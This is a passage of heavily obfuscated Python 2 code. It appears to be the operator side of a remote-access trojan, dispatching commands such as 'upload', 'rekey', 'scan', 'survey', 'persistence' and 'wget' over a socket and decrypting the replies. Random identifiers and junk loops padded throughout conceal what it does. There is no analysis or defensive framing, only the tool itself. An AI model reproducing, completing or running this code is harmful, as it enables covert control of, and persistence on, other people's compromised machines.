                    if kVgXyvfMhbzvUHsMHTjgkHSZeeumYhkk in ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB:
                        ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB = ysSeLddjAtqVUlxhNCALuCnucwIvjhJA
                WUetfBAbhvHorsheRaCajunshIBsTtEY = WUetfBAbhvHorsheRaCajunshIBsTtEY.strip()
                UKljRqYmyRjdhxzdwCmbaZADNXeYjPzg(SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ, WUetfBAbhvHorsheRaCajunshIBsTtEY, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'upload':

            try:
                HtyVBYNWuBlUSJPLWjuAzoarQlJtBXsp = 'QXJlURDMDThlBTLzyyLJARCntztkCbqP'
                GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu = 'dPLfeJlyxDgebJbRMmcgJytcpXQHrgkk'
                czykTBuXdsIFsKxAFtJDVDxkAUZtwRvG = 'QUtpypfSEUqqnCMefMwJCQISEPZqqVzL'
                kzRynbbdBdojnwaLEyAzQQDJrTtjJdoW = 'mgWIPblKgYrHkLTgSPhsfdSybKhaQFbU'
                hbHLACALadfCVdcmydPbuOlKLIIbrlCX = 'sZQbdLrygvKRZHaKAsIXsaynaIFNjcrE'
                bAEGMhYUSbnSybKALWtniIalejPpbsmv = 'RKpJwLAPEsqPMSIStCJDrCUyYawcejTO'
                VcbxczZhlLlWfYIRfkKBoANWHCQglmfG = [
                        'QXJlURDMDThlBTLzyyLJARCntztkCbqP',
                        'QUtpypfSEUqqnCMefMwJCQISEPZqqVzL',
                        'sZQbdLrygvKRZHaKAsIXsaynaIFNjcrE',
                        'YfnIbgXSCeUajDRXvtrinQuPUjBoXgHR'
                ]
                for HtyVBYNWuBlUSJPLWjuAzoarQlJtBXsp in bAEGMhYUSbnSybKALWtniIalejPpbsmv:
                    for GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu in czykTBuXdsIFsKxAFtJDVDxkAUZtwRvG:
                        if kzRynbbdBdojnwaLEyAzQQDJrTtjJdoW == hbHLACALadfCVdcmydPbuOlKLIIbrlCX:
                            GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu = HtyVBYNWuBlUSJPLWjuAzoarQlJtBXsp
                        elif hbHLACALadfCVdcmydPbuOlKLIIbrlCX == GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu:
                            GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu = bAEGMhYUSbnSybKALWtniIalejPpbsmv
                        else:
                            hbHLACALadfCVdcmydPbuOlKLIIbrlCX = bAEGMhYUSbnSybKALWtniIalejPpbsmv
                            for GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu in VcbxczZhlLlWfYIRfkKBoANWHCQglmfG:
                                czykTBuXdsIFsKxAFtJDVDxkAUZtwRvG = GGBaSxQCYXXrzivhBKiEOwFxtDwChyAu
            except Exception:
                pass
            for WUetfBAbhvHorsheRaCajunshIBsTtEY in action.split():

                ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw = 'nVnLlerqPNKPtIXDhqUUkkcnfsHiCUmP'
                mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw = 'opGlbNsAYnBlUjEBfrTbNwQPmbTMAMAt'
                cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy = 'AheyytZNyZKKhdeaZWQfzUhoxtFCYOjA'
                AnnqdrjVcdtORTyixJcfBQLdysgsXNhg = 'ZCFKUrHybcUwCkHbwXMGIQxAuUVAAtRF'
                if mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw == ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw:
                    for ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw in mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                        if mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw == mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                            cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy = 'AnnqdrjVcdtORTyixJcfBQLdysgsXNhg'
                        elif cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy == AnnqdrjVcdtORTyixJcfBQLdysgsXNhg:
                            AnnqdrjVcdtORTyixJcfBQLdysgsXNhg = ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw
                        else:
                            ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw = mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw
                elif cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy == cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy:
                    for cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy in mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                        if AnnqdrjVcdtORTyixJcfBQLdysgsXNhg == mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                            cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy = 'AnnqdrjVcdtORTyixJcfBQLdysgsXNhg'
                        elif cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy == AnnqdrjVcdtORTyixJcfBQLdysgsXNhg:
                            AnnqdrjVcdtORTyixJcfBQLdysgsXNhg = ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw
                        else:
                            ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw = mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw
                            for cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy in mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                                if AnnqdrjVcdtORTyixJcfBQLdysgsXNhg == mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw:
                                    cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy = 'AnnqdrjVcdtORTyixJcfBQLdysgsXNhg'
                                elif cUMNNrCzrNoByzieVnrtkwpPkNeJSQCy == AnnqdrjVcdtORTyixJcfBQLdysgsXNhg:
                                    AnnqdrjVcdtORTyixJcfBQLdysgsXNhg = ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw
                                else:
                                    ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw = AnnqdrjVcdtORTyixJcfBQLdysgsXNhg
                else:
                    ZsAoIrZDXwOnwgHhxFUfLIFWDipFKgZw = mQHcUbRLcJvypJcYJwXlcxkuYdFoRnSw
                WUetfBAbhvHorsheRaCajunshIBsTtEY = WUetfBAbhvHorsheRaCajunshIBsTtEY.strip()
                ehRKSVQWUJyNRXJlOKfRDOvOWCanPXzl(SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ, WUetfBAbhvHorsheRaCajunshIBsTtEY, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'rekey':

            IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv = 'vzwHOWgXhhyfhlGIFwPSNVBVKNjoomyq'
            LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ = 'ZuEwCrgpqkGhGLuOJSHutmEpWjpJuzsv'
            GPIGVSULmrloMPgZEFlCuTmjcCCqALCO = 'BSFRbWPzFFeKbKNDJjTNqbXamrLxgVXl'
            jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK = 'NCrhGCcWDYzwpKjzbfdpoJJSsWqHlIIx'
            if LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ == IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv:
                for IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv in LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                    if LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ == LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                        GPIGVSULmrloMPgZEFlCuTmjcCCqALCO = 'jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK'
                    elif GPIGVSULmrloMPgZEFlCuTmjcCCqALCO == jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK:
                        jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK = IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv
                    else:
                        IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv = LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ
            elif GPIGVSULmrloMPgZEFlCuTmjcCCqALCO == GPIGVSULmrloMPgZEFlCuTmjcCCqALCO:
                for GPIGVSULmrloMPgZEFlCuTmjcCCqALCO in LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                    if jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK == LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                        GPIGVSULmrloMPgZEFlCuTmjcCCqALCO = 'jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK'
                    elif GPIGVSULmrloMPgZEFlCuTmjcCCqALCO == jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK:
                        jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK = IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv
                    else:
                        IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv = LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ
                        for GPIGVSULmrloMPgZEFlCuTmjcCCqALCO in LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                            if jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK == LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ:
                                GPIGVSULmrloMPgZEFlCuTmjcCCqALCO = 'jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK'
                            elif GPIGVSULmrloMPgZEFlCuTmjcCCqALCO == jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK:
                                jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK = IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv
                            else:
                                IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv = jJXTWXvCrHjVDCvqQzvuBdLWBKdwpKBK
            else:
                IhjIZxzlJzpHzfOIjRTwTVxmdbeoCUpv = LLfKFXaiSExLbrvtGmvQHbEXObwzOhDZ
            DETfGmKuhOglKRjePCaUWvDYeugRneWo = oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg(SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ, server=True)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr in ['scan', 'survey', 'persistence', 'unzip', 'wget']:

            vjPNWzTZqoQppSyFkjyRDNGmOjBeTMSg = 'bIVsUFrdxLwzaZMDeTKvOPRvtwYowrvs'
            LJTvmoQKijmOBYGglkBAQQSypTpbCniF = 'TjdqMlzAHHGAHmgAClsfJIYQBnlVeaVx'
            zsFyZYEQEgQLQjPVfQueABqzEwiFhNdW = 'BsgsqeqyNmfKubjYJAQHqYAgELCMiKjs'
            dOTGCHrUxQPpOUsNYTQqywivfCKBeZcr = 'tDtYiQXZToqmMjMQvgTKoYasxbamZPwv'
            tujNffMpfnWlSExsYsJvdoYYXSIoKduw = 'mbqWRaVshwlxpWgDmgyxVQPkyZaUnmiN'
            if vjPNWzTZqoQppSyFkjyRDNGmOjBeTMSg in LJTvmoQKijmOBYGglkBAQQSypTpbCniF:
                vjPNWzTZqoQppSyFkjyRDNGmOjBeTMSg = tujNffMpfnWlSExsYsJvdoYYXSIoKduw
                if LJTvmoQKijmOBYGglkBAQQSypTpbCniF in zsFyZYEQEgQLQjPVfQueABqzEwiFhNdW:
                    LJTvmoQKijmOBYGglkBAQQSypTpbCniF = dOTGCHrUxQPpOUsNYTQqywivfCKBeZcr
            elif LJTvmoQKijmOBYGglkBAQQSypTpbCniF in vjPNWzTZqoQppSyFkjyRDNGmOjBeTMSg:
                zsFyZYEQEgQLQjPVfQueABqzEwiFhNdW = LJTvmoQKijmOBYGglkBAQQSypTpbCniF
                if zsFyZYEQEgQLQjPVfQueABqzEwiFhNdW in LJTvmoQKijmOBYGglkBAQQSypTpbCniF:
                    LJTvmoQKijmOBYGglkBAQQSypTpbCniF = tujNffMpfnWlSExsYsJvdoYYXSIoKduw
            print 'Running {}...'.format(gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr)
            lgzZAqxVTrwKsvFBJOyhVuXfeqVrYfBp = SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ.recv(1024)
            print VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA(lgzZAqxVTrwKsvFBJOyhVuXfeqVrYfBp, DETfGmKuhOglKRjePCaUWvDYeugRneWo)
if __name__ == '__main__':

    MzJWxxHCUinTldgCGzORtTXMvXDxrNJo = 'xTcTcQYgsYDbnIPbIXWnXAqzDhdSeyYx'
    ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK = 'pcruxSbHeNTKSikuPnuxuwkINNqHNkNz'
    UiQcHrrObaleXEBYTjryKvIdOqYyuMRu = 'BoIfFikzmYZpxnCUhnadmltWjgKzEuDH'
    TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm = 'eQPWONhukmjaTxcMJziWdWhgmGytnjlS'
    if ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK == MzJWxxHCUinTldgCGzORtTXMvXDxrNJo:
        for MzJWxxHCUinTldgCGzORtTXMvXDxrNJo in ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
            if ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK == ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
                UiQcHrrObaleXEBYTjryKvIdOqYyuMRu = 'TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm'
            elif UiQcHrrObaleXEBYTjryKvIdOqYyuMRu == TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm:
                TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm = MzJWxxHCUinTldgCGzORtTXMvXDxrNJo
            else:
                MzJWxxHCUinTldgCGzORtTXMvXDxrNJo = ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK
    elif UiQcHrrObaleXEBYTjryKvIdOqYyuMRu == UiQcHrrObaleXEBYTjryKvIdOqYyuMRu:
        for UiQcHrrObaleXEBYTjryKvIdOqYyuMRu in ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
            if TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm == ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
                UiQcHrrObaleXEBYTjryKvIdOqYyuMRu = 'TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm'
            elif UiQcHrrObaleXEBYTjryKvIdOqYyuMRu == TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm:
                TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm = MzJWxxHCUinTldgCGzORtTXMvXDxrNJo
            else:
                MzJWxxHCUinTldgCGzORtTXMvXDxrNJo = ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK
                for UiQcHrrObaleXEBYTjryKvIdOqYyuMRu in ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
                    if TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm == ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK:
                        UiQcHrrObaleXEBYTjryKvIdOqYyuMRu = 'TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm'
                    elif UiQcHrrObaleXEBYTjryKvIdOqYyuMRu == TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm:
                        TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm = MzJWxxHCUinTldgCGzORtTXMvXDxrNJo
                    else:
                        MzJWxxHCUinTldgCGzORtTXMvXDxrNJo = TzrkCRsdhLkLmpVaNIAFimRQhDjdoyOm
    else:
        MzJWxxHCUinTldgCGzORtTXMvXDxrNJo = ObKaMZHeEGPAuCxmPPZBLWeUkewdDHfK
    qiMWPvHvljyCdHbajcSUdpxLsWQPxUNF()
